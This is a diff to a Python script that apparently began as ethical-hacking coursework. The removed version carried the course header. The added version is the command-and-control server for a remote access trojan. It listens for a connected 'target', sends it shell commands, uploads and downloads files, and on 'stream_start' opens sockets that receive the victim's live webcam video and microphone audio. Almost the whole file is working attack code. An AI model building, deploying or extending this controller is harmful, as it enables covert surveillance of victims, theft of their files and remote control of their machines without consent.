@@ -1,106 +1,182 @@
-################################################
-# Author: Watthanasak Jeamwatthanachai, PhD    #
-# Class: SIIT Ethical Hacking, 2023-2024       #
-################################################
+import socket
+import json
+import os
+import threading
+import cv2
+import pyaudio
+import pickle
+import struct
+import time
 
-# Import necessary libraries
-import socket  # This library is used for creating socket connections.
-import json  # JSON is used for encoding and decoding data in a structured format.
-import os  # This library allows interaction with the operating system.
+# --- Global Flag to Stop Threads ---
+stop_threads = False
 
+# --- Stream Reception Functions ---
+def video_reception_thread():
+    global stop_threads
+    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    video_server.bind(('0.0.0.0', 9999))
+    video_server.listen(1)
+    print("[*] Video server waiting for connection on port 9999...")
+    
+    try:
+        conn, addr = video_server.accept()
+        print(f"[+] Video client connected from: {addr}")
+        
+        data = b""
+        payload_size = struct.calcsize("L")
 
-# Function to send data reliably as JSON-encoded strings
-def reliable_send(data):
-    # Convert the input data into a JSON-encoded string.
+        while not stop_threads:
+            while len(data) < payload_size:
+                packet = conn.recv(4096)
+                if not packet: raise ConnectionError("Client disconnected")
+                data += packet
+            
+            packed_msg_size = data[:payload_size]
+            data = data[payload_size:]
+            msg_size = struct.unpack("L", packed_msg_size)[0]
+
+            while len(data) < msg_size:
+                data += conn.recv(4096)
+            
+            frame_data = data[:msg_size]
+            data = data[msg_size:]
+            
+            frame = pickle.loads(frame_data)
+            cv2.imshow('Live Video Stream', frame)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                print("[!] 'q' pressed in video window. Type 'quit' in shell to exit.")
+                # Don't stop threads here, let the main shell handle it
+    except Exception as e:
+        print(f"[!] Video stream ended: {e}")
+    finally:
+        print("[-] Video reception thread finished.")
+        cv2.destroyAllWindows()
+        video_server.close()
+
+def audio_reception_thread():
+    global stop_threads
+    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    audio_server.bind(('0.0.0.0', 9998))
+    audio_server.listen(1)
+    print("[*] Audio server waiting for connection on port 9998...")
+
+    try:
+        conn, addr = audio_server.accept()
+        print(f"[+] Audio client connected from: {addr}")
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
+        
+        while not stop_threads:
+            data = conn.recv(1024)
+            if not data: break
+            stream.write(data)
+    except Exception as e:
+        print(f"[!] Audio stream ended: {e}")
+    finally:
+        print("[-] Audio reception thread finished.")
+        audio_server.close()
+
+# --- Reliable Send/Receive & File Transfer ---
+def reliable_send(target, data):
     jsondata = json.dumps(data)
-    # Send the JSON-encoded data over the network connection after encoding it as bytes.
     target.send(jsondata.encode())
 
-
-# Function to receive data reliably as JSON-decoded strings
-def reliable_recv():
+def reliable_recv(target):
     data = ''
     while True:
         try:
-            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
-            # and remove any trailing whitespace characters.
             data = data + target.recv(1024).decode().rstrip()
-            # Parse the received data as a JSON-decoded object.
             return json.loads(data)
-        except ValueError:
+        except (ValueError, json.JSONDecodeError):
             continue
+        except (ConnectionResetError, ConnectionAbortedError):
+            print("\n[!] Client has disconnected.")
+            return None
 
+def upload_file(target, file_name):
+    try:
+        with open(file_name, 'rb') as f:
+            target.send(f.read())
+        print("[+] File uploaded successfully.")
+    except FileNotFoundError:
+        print(f"[-] Error: File '{file_name}' not found on server machine.")
 
-# Function to upload a file to the target machine
-def upload_file(file_name):
-    # Open the specified file in binary read ('rb') mode.
-    f = open(file_name, 'rb')
-    # Read the contents of the file and send them over the network connection to the target.
-    target.send(f.read())
-
-
-# Function to download a file from the target machine
-def download_file(file_name):
-    # Open the specified file in binary write ('wb') mode.
-    f = open(file_name, 'wb')
-    # Set a timeout for receiving data from the target (1 second).
-    target.settimeout(1)
-    chunk = target.recv(1024)
-    while chunk:
-        # Write the received data (chunk) to the local file.
-        f.write(chunk)
+def download_file(target, file_name):
+    print(f"[*] Downloading '{file_name}'...")
+    with open(file_name, 'wb') as f:
+        target.settimeout(2)
         try:
-            # Attempt to receive another chunk of data from the target.
             chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    # Reset the timeout to its default value (None).
-    target.settimeout(None)
-    # Close the local file after downloading is complete.
-    f.close()
-
-
-# Function for the main communication loop with the target
-def target_communication():
-    while True:
-        # Prompt the user for a command to send to the target.
-        command = input('* Shell~%s: ' % str(ip))
-        # Send the user's command to the target using the reliable_send function.
-        reliable_send(command)
-        if command == 'quit':
-            # If the user enters 'quit', exit the loop and close the connection.
-            break
-        elif command == 'clear':
-            # If the user enters 'clear', clear the terminal screen.
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target (not implemented).
+            if chunk == b'FILE_NOT_FOUND_ERROR':
+                print("[-] Client reported that the file does not exist.")
+                f.close()
+                os.remove(file_name)
+                return
+            while chunk:
+                f.write(chunk)
+                chunk = target.recv(1024)
+        except socket.timeout:
             pass
-        elif command[:8] == 'download':
-            # If the user enters 'download', initiate the download of a file from the target.
-            download_file(command[9:])
-        elif command[:6] == 'upload':
-            # If the user enters 'upload', initiate the upload of a file to the target.
-            upload_file(command[7:])
-        else:
-            # For other commands, receive and print the result from the target.
-            result = reliable_recv()
-            print(result)
+    target.settimeout(None)
+    print(f"[+] Download complete. Saved as '{file_name}'.")
 
+# --- Main Server Shell ---
+def target_communication(target, ip):
+    global stop_threads
 
-# Create a socket for the server
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while not stop_threads:
+        try:
+            command = input(f'* Shell~{str(ip)}: ')
+            if not command: continue
 
-# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.1.12', 5555))
+            reliable_send(target, command)
 
-# Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
-sock.listen(5)
+            if command == 'quit':
+                stop_threads = True
+                break
+            elif command == 'stream_start':
+                v_thread = threading.Thread(target=video_reception_thread, daemon=True)
+                a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
+                v_thread.start()
+                a_thread.start()
+            
+            # For file transfers, the functions handle their own communication.
+            # For other commands, we expect a single response.
+            if not command.startswith('upload') and not command.startswith('download'):
+                result = reliable_recv(target)
+                if result is None:
+                    stop_threads = True
+                    break
+                print(result)
+        except KeyboardInterrupt:
+            print("\n[!] Ctrl+C detected. Shutting down server.")
+            reliable_send(target, 'quit')
+            stop_threads = True
+            break
+        except Exception as e:
+            print(f"[!] An error occurred in the main shell: {e}")
+            stop_threads = True
+            break
+            
+    print("[-] Main shell loop terminated.")
 
-# Accept incoming connection from the target and obtain the target's IP address.
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('0.0.0.0', 5555))
+    print('[+] Listening For The Incoming Connections on port 5555...')
+    sock.listen(1)
+    
+    target, ip = sock.accept()
+    print(f'[+] Target Connected From: {str(ip)}')
+    
+    target_communication(target, ip)
+    
+    print("[*] Shutting down all threads...")
+    sock.close()
 
-# Start the main communication loop with the target by calling target_communication.
-target_communication()
+if __name__ == "__main__":
+    main()
